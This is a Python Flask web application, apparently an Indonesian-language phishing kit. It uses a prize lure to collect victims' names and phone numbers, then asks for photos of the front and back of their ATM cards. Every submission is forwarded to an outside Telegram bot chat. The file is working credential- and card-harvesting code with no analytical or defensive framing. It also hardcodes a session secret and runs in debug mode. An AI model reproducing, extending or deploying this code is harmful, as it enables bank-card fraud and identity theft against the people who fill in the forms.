from flask import Flask, render_template, request, redirect, session, url_for
import requests
import os
from werkzeug.utils import secure_filename

UPLOAD_FOLDER = 'static/uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
    
app = Flask(__name__)
app.secret_key = 'j1s34ft43utbu76'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

@app.route('/', methods=['GET', 'POST'])
def halaman1():
    if request.method == 'POST':
        nama = request.form.get('nama')
        nomor = request.form.get('nomor')

        session['nama'] = nama
        session['nomor'] = nomor

        teks_awal = (
            "🔔DATA BARU (AWAL):\n"
            "───────────────────\n"
            f"🧾Nama: {nama}\n"
            f"📱nomor: {nomor}"
        )

        url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
        payload={'chat_id': TELEGRAM_CHAT_ID, 'text': teks_awal}

        requests.post(url, data=payload)

        return redirect('/halaman2')
    return render_template('halaman1.html')

@app.route("/halaman2", methods=["GET", "POST"])
def halaman2():
    if request.method == 'POST':
        hadiah = request.form.get('hadiah')
        file1 = request.files.get('atm_depan')
        file2 = request.files.get('atm_belakang')

        nama = session.get('nama')
        nomor = session.get('nomor')

        photo_depan_url = 'tidak ada'
        photo_belakang_url = 'tidak ada'

        for idx, file in enumerate([file1, file2]):
            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
                os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
                file.save(filepath)
                url = url_for('static', filename=f'uploads/{filename}', _external=True)

                if idx == 0:
                    photo_depan_url = url
                else:
                    photo_belakang_url = url

        caption = (
            "🔔DATA BARU (AKHIR):\n"
            "───────────────────\n"
            f"🧾Nama: {nama}\n"
            f"📱nomor: {nomor}\n"
            f"🎁hadiah: {hadiah}\n"
            f"💳atm (depan): {photo_depan_url}\n"
            f"💳atm (belakang): {photo_belakang_url}"
        )

        requests.post(
                f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage',
                data={'chat_id': TELEGRAM_CHAT_ID, 'text': caption}
            )

        return redirect('halaman3')
    return render_template('halaman2.html')

@app.route('/halaman3')
def halaman3():
    # halaman3 hanya tampil gambar penutup full body
    return render_template('halaman3.html')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=3000, debug='True')